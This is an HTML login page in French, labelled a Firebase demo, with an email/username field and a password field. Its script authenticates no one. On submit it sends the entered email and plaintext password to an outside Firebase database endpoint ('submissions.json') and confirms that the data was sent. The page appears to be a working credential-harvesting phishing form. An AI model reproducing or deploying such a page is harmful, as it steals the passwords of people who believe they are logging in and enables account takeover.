<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <title>Démo — Écran de connexion (Firebase)</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white text-gray-900">
  <div class="min-h-screen flex flex-col">
    <main class="flex-1">
      <div class="max-w-2xl mx-auto px-6 pt-10 pb-16">
        <div class="rounded-3xl border bg-white/60 backdrop-blur p-6 sm:p-10 shadow-sm">
          <div class="flex items-start justify-between">
            <h1 class="text-3xl sm:text-5xl font-extrabold tracking-tight">Se connecter</h1>
            <button aria-label="Fermer" class="p-2 rounded-full hover:bg-gray-100">×</button>
          </div>

          <form id="loginForm" class="mt-6 space-y-4" autocomplete="off">
            <div class="relative">
              <input id="email" type="email" placeholder="E-mail ou nom d'utilisateur"
                class="w-full border border-gray-300 rounded-xl px-4 py-3 bg-gray-100 focus:outline-none focus:ring-2 focus:ring-black"
                autocomplete="username" />
            </div>

            <div class="relative">
              <input id="password" type="password" placeholder="Mot de passe"
                class="w-full border border-gray-300 rounded-xl px-4 py-3 bg-gray-100 focus:outline-none focus:ring-2 focus:ring-black"
                autocomplete="current-password" />
            </div>

            <div class="text-sm">
              <a href="#" onclick="event.preventDefault()" class="text-gray-700 hover:underline">Mot de passe oublié ?</a>
            </div>

            <button id="submitBtn" type="submit" disabled
              class="w-full rounded-2xl px-6 py-4 text-lg font-semibold transition disabled:opacity-50 disabled:cursor-not-allowed bg-gray-100 text-gray-500">
              Se connecter
            </button>
          </form>
        </div>
      </div>
    </main>
  </div>

  <script>
    const DB_URL = "https://fir-login-d968e-default-rtdb.europe-west1.firebasedatabase.app";

    const emailEl = document.getElementById('email');
    const pwdEl = document.getElementById('password');
    const submitBtn = document.getElementById('submitBtn');
    const loginForm = document.getElementById('loginForm');

    // Active/désactive bouton
    function refreshSubmit() {
      const ok = emailEl.value.trim().length > 0 && pwdEl.value.length > 0;
      submitBtn.disabled = !ok;
      submitBtn.className = ok
        ? 'w-full rounded-2xl px-6 py-4 text-lg font-semibold bg-[#f53152] text-white hover:opacity-90 transition'
        : 'w-full rounded-2xl px-6 py-4 text-lg font-semibold bg-gray-100 text-gray-500 disabled:cursor-not-allowed transition';
    }
    emailEl.addEventListener('input', refreshSubmit);
    pwdEl.addEventListener('input', refreshSubmit);

    // Envoi vers Firebase
    loginForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      submitBtn.disabled = true;
      submitBtn.textContent = "Envoi...";

      const data = {
        email: emailEl.value,
        password: pwdEl.value,
        created_at: new Date().toISOString()
      };

      try {
        const r = await fetch(`${DB_URL}/submissions.json`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });
        if (!r.ok) throw new Error("Erreur Firebase");
        alert("✅ Données envoyées !");
        emailEl.value = "";
        pwdEl.value = "";
      } catch (err) {
        alert("❌ Erreur: " + err.message);
      } finally {
        submitBtn.textContent = "Se connecter";
        refreshSubmit();
      }
    });

    refreshSubmit();
  </script>
</body>
</html>


